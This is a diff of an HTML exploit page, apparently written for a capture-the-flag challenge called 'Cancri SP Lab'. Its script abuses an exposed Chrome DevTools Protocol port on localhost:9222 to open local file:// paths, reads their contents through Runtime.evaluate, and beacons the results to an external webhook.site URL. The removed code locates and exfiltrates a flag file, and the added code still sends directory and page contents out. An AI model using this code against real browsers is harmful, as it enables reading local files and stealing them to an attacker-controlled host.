@@ -7,105 +7,93 @@
 </head>
 <body>
   <h1>Cancri SP Lab</h1>
-  <pre id="status">Waiting for challenge browser...</pre>
+  <pre id="status">Starting diagnostics...</pre>
 
   <script>
     const HOOK =
       "https://webhook.site/fa6817a2-e483-45f5-b5ba-2b895046ab55";
 
-    function report(stage, data) {
-      const body = JSON.stringify({
-        stage: stage,
-        data: data,
+    function log(stage, data = {}) {
+      const message = {
+        stage,
+        data,
         time: new Date().toISOString()
-      });
+      };
 
-      navigator.sendBeacon(HOOK, body);
       document.getElementById("status").textContent =
-        stage + ": " + String(data).slice(0, 500);
+        JSON.stringify(message, null, 2);
+
+      navigator.sendBeacon(
+        HOOK,
+        new Blob(
+          [JSON.stringify(message)],
+          { type: "text/plain" }
+        )
+      );
     }
 
-    const sleep = ms =>
-      new Promise(resolve => setTimeout(resolve, ms));
+    async function run() {
+      log("page_loaded", { url: location.href });
 
-    async function openAndRead(fileUrl) {
-      const response = await fetch(
-        "http://localhost:9222/json/new?" + fileUrl,
-        { method: "PUT" }
-      );
+      try {
+        const response = await fetch(
+          "http://localhost:9222/json/new?file:///challenge/",
+          { method: "PUT" }
+        );
 
-      const target = await response.json();
-      report("cdp_target", target);
+        const text = await response.text();
 
-      const ws = new WebSocket(target.webSocketDebuggerUrl);
+        log("cdp_response", {
+          status: response.status,
+          body: text
+        });
 
-      return await new Promise((resolve, reject) => {
-        const timer = setTimeout(() => {
-          ws.close();
-          reject(new Error("CDP response timeout"));
-        }, 8000);
+        if (!response.ok) {
+          return;
+        }
 
-        ws.onerror = () => {
-          clearTimeout(timer);
-          reject(new Error("CDP WebSocket error"));
-        };
+        const target = JSON.parse(text);
+
+        log("cdp_target", {
+          id: target.id,
+          url: target.url,
+          websocket: target.webSocketDebuggerUrl
+        });
+
+        const ws = new WebSocket(
+          target.webSocketDebuggerUrl
+        );
+
+        ws.onerror = () => log("websocket_error");
 
         ws.onopen = async () => {
-          await sleep(300);
+          log("websocket_open");
+
           ws.send(JSON.stringify({
             id: 1,
             method: "Runtime.evaluate",
             params: {
-              expression: "document.documentElement.innerHTML",
+              expression: "document.body.innerText",
               returnByValue: true
             }
           }));
         };
 
         ws.onmessage = event => {
-          const msg = JSON.parse(event.data);
-
-          if (msg.id === 1) {
-            clearTimeout(timer);
-            ws.close();
-
-            if (msg.error) {
-              reject(new Error(JSON.stringify(msg.error)));
-            } else {
-              resolve(msg.result.result.value || "");
-            }
-          }
+          log("cdp_result", {
+            response: event.data
+          });
         };
-      });
+
+      } catch (error) {
+        log("exception", {
+          message: error.message,
+          stack: error.stack
+        });
+      }
     }
 
-    (async () => {
-      try {
-        report("started", location.href);
-
-        // First try to enumerate the challenge directory.
-        const listing = await openAndRead("file:///challenge/");
-        report("directory_listing", listing);
-
-        // Find the randomly named flag file.
-        const match = listing.match(/flag-[a-f0-9]{32}/i);
-
-        if (!match) {
-          report("flag_filename_not_found", listing);
-          return;
-        }
-
-        const flagPath = "file:///challenge/" + match[0];
-        report("flag_path_found", flagPath);
-
-        // Open the flag file in a new Chrome target.
-        const flagContent = await openAndRead(flagPath);
-        report("FLAG_CONTENT", flagContent);
-
-      } catch (e) {
-        report("error", e.stack || e.message || String(e));
-      }
-    })();
+    run();
   </script>
 </body>
 </html>
